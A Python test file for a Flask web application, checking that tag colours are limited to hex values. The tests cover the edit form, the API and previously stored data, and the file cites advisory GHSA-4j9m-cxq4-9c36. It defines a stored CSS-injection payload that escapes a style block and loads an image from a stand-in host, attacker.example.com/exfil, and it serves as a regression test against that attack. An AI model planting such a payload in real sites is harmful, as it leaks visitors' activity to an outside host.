#!/usr/bin/env python3
"""
Tag colour is rendered into a <style> block, so it must only ever be a hex colour.

Anything else is stored CSS injection (GHSA-4j9m-cxq4-9c36) - Jinja2's HTML autoescaping
does not protect a CSS context, the payload below needs none of the characters it escapes.

Covers the three ways a colour can be set/rendered:
 - the tag edit form
 - the API (PUT and POST)
 - rendering a value already in the datastore (from before this was validated)
"""

import json
from flask import url_for
from .util import get_UUID_for_tag_name

CSS_INJECTION = 'red} *{background-image:url(https://attacker.example.com/exfil)} .x{color:'


def _add_tag(client, name):
    res = client.post(url_for("tags.form_tag_add"), data={"name": name}, follow_redirects=True)
    assert b"Tag added" in res.data
    return get_UUID_for_tag_name(client, name=name)


def test_tag_colour_form_rejects_css_injection(client, live_server, measure_memory_usage, datastore_path):
    tag_uuid = _add_tag(client, "css-injection-tag")

    res = client.post(
        url_for("tags.form_tag_edit_submit", uuid=tag_uuid),
        data={"name": "css-injection-tag", "tag_colour": CSS_INJECTION},
        follow_redirects=True
    )
    assert b"Updated" not in res.data
    assert b"Must be a hex colour" in res.data

    datastore = client.application.config.get('DATASTORE')
    assert not datastore.data['settings']['application']['tags'][tag_uuid].get('tag_colour')

    # ..and it never reaches the stylesheet on either page that renders tag colours
    for page in (url_for("watchlist.index"), url_for("tags.tags_overview_page")):
        assert b"attacker.example.com" not in client.get(page).data


def test_tag_colour_form_accepts_hex(client, live_server, measure_memory_usage, datastore_path):
    tag_uuid = _add_tag(client, "hex-colour-tag")

    res = client.post(
        url_for("tags.form_tag_edit_submit", uuid=tag_uuid),
        data={"name": "hex-colour-tag", "tag_colour": "#4f8ef7"},
        follow_redirects=True
    )
    assert b"Updated" in res.data

    datastore = client.application.config.get('DATASTORE')
    assert datastore.data['settings']['application']['tags'][tag_uuid].get('tag_colour') == '#4f8ef7'

    res = client.get(url_for("tags.tags_overview_page"))
    assert b"background-color: #4f8ef7" in res.data

    # An empty value must still be allowed - that's "use the auto-generated colour"
    res = client.post(
        url_for("tags.form_tag_edit_submit", uuid=tag_uuid),
        data={"name": "hex-colour-tag", "tag_colour": ""},
        follow_redirects=True
    )
    assert b"Updated" in res.data
    assert not datastore.data['settings']['application']['tags'][tag_uuid].get('tag_colour')


def test_tag_colour_api_rejects_css_injection(client, live_server, measure_memory_usage, datastore_path):
    api_key = live_server.app.config['DATASTORE'].data['settings']['application'].get('api_access_token')
    headers = {'content-type': 'application/json', 'x-api-key': api_key}

    res = client.post(url_for("tag"), data=json.dumps({"title": "api-colour-tag"}), headers=headers)
    assert res.status_code == 201, res.data
    tag_uuid = res.json['uuid']

    res = client.put(url_for("tag", uuid=tag_uuid), data=json.dumps({"tag_colour": CSS_INJECTION}), headers=headers)
    assert res.status_code == 400, res.data

    # Creating a tag with a bad colour in one shot must fail too
    res = client.post(url_for("tag"), data=json.dumps({"title": "api-colour-tag-2", "tag_colour": CSS_INJECTION}),
                      headers=headers)
    assert res.status_code == 400, res.data

    # A hex colour is accepted and round-trips
    res = client.put(url_for("tag", uuid=tag_uuid), data=json.dumps({"tag_colour": "#00ff00"}), headers=headers)
    assert res.status_code == 200, res.data
    assert client.get(url_for("tag", uuid=tag_uuid), headers=headers).json.get('tag_colour') == '#00ff00'

    assert b"attacker.example.com" not in client.get(url_for("watchlist.index")).data


def test_tag_colour_already_stored_is_not_rendered(client, live_server, measure_memory_usage, datastore_path):
    """A value stored by an older version must still not make it into the stylesheet."""
    tag_uuid = _add_tag(client, "poisoned-tag")

    datastore = client.application.config.get('DATASTORE')
    tag = datastore.data['settings']['application']['tags'][tag_uuid]
    tag['tag_colour'] = CSS_INJECTION
    tag.commit()

    for page in (url_for("watchlist.index"),
                 url_for("tags.tags_overview_page"),
                 url_for("tags.form_tag_edit", uuid=tag_uuid)):
        res = client.get(page)
        assert res.status_code == 200
        assert b"attacker.example.com" not in res.data, f"CSS injection rendered on {page}"
